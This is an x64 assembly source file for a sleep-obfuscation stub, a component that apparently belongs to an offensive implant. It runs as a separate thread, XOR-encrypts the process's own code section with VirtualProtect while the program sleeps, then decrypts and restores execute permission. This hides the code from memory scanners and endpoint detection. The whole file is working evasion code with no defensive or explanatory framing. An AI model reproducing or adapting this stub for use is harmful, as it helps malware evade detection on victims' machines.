    .intel_syntax noprefix

    #
    # obfuscate_x64.S — Sleep obfuscation stub.
    #
    # This position-independent function is copied to a VirtualAlloc'd
    # region OUTSIDE the PE image so it can encrypt/decrypt the image
    # without corrupting itself.
    #
    # Called as a thread entry point (CreateThread LPTHREAD_START_ROUTINE):
    #   rcx = pointer to obf_context_t
    #
    # obf_context_t layout:
    #   +0x00  pfnSleep            (QWORD — kernel32!Sleep)
    #   +0x08  pfnVirtualProtect   (QWORD — kernel32!VirtualProtect)
    #   +0x10  text_base           (QWORD — start of .text section)
    #   +0x18  text_size           (QWORD — size, QWORD-aligned)
    #   +0x20  xor_key             (QWORD — 64-bit XOR key)
    #   +0x28  interval_ms         (DWORD — normal operation interval)
    #   +0x2C  obfuscation_ms      (DWORD — encrypted sleep duration)
    #   +0x30  stop_flag           (DWORD — set nonzero to exit loop)
    #

    .global obfuscate_x64_start
    .global obfuscate_x64_end

    .text

obfuscate_x64_start:

    push rbp
    mov  rbp, rsp
    push rbx
    push r12
    push r13
    push r14
    push r15
    sub  rsp, 0x38                      # shadow(32) + locals(24), 16-aligned

    mov  r15, rcx                       # r15 = context pointer

.Loloop:
    # --- Check stop flag ---
    mov  eax, dword ptr [r15 + 0x30]
    test eax, eax
    jnz  .Lodone

    # --- Sleep(interval_ms) — PE decrypted, normal operation ---
    mov  ecx, dword ptr [r15 + 0x28]
    call qword ptr [r15 + 0x00]         # Sleep

    # --- Check stop flag again ---
    mov  eax, dword ptr [r15 + 0x30]
    test eax, eax
    jnz  .Lodone

    # --- VirtualProtect(text_base, text_size, PAGE_READWRITE, &old) ---
    mov  rcx, qword ptr [r15 + 0x10]
    mov  rdx, qword ptr [r15 + 0x18]
    mov  r8d, 0x04                      # PAGE_READWRITE
    lea  r9,  [rsp + 0x30]             # &oldProt (local on stack)
    call qword ptr [r15 + 0x08]        # VirtualProtect

    # --- XOR encrypt the code section ---
    mov  r12, qword ptr [r15 + 0x10]   # text_base
    mov  r13, qword ptr [r15 + 0x18]   # text_size
    mov  r14, qword ptr [r15 + 0x20]   # xor_key
    shr  r13, 3                         # count = size / 8

.Loenc:
    xor  qword ptr [r12], r14
    add  r12, 8
    dec  r13
    jnz  .Loenc

    # --- Sleep(obfuscation_ms) — code section encrypted ---
    mov  ecx, dword ptr [r15 + 0x2C]
    call qword ptr [r15 + 0x00]         # Sleep

    # --- XOR decrypt the code section ---
    mov  r12, qword ptr [r15 + 0x10]
    mov  r13, qword ptr [r15 + 0x18]
    mov  r14, qword ptr [r15 + 0x20]
    shr  r13, 3

.Lodec:
    xor  qword ptr [r12], r14
    add  r12, 8
    dec  r13
    jnz  .Lodec

    # --- VirtualProtect(text_base, text_size, PAGE_EXECUTE_READ, &old) ---
    mov  rcx, qword ptr [r15 + 0x10]
    mov  rdx, qword ptr [r15 + 0x18]
    mov  r8d, 0x20                      # PAGE_EXECUTE_READ
    lea  r9,  [rsp + 0x30]
    call qword ptr [r15 + 0x08]        # VirtualProtect

    jmp  .Loloop

.Lodone:
    xor  eax, eax                       # return 0
    add  rsp, 0x38
    pop  r15
    pop  r14
    pop  r13
    pop  r12
    pop  rbx
    pop  rbp
    ret

obfuscate_x64_end:
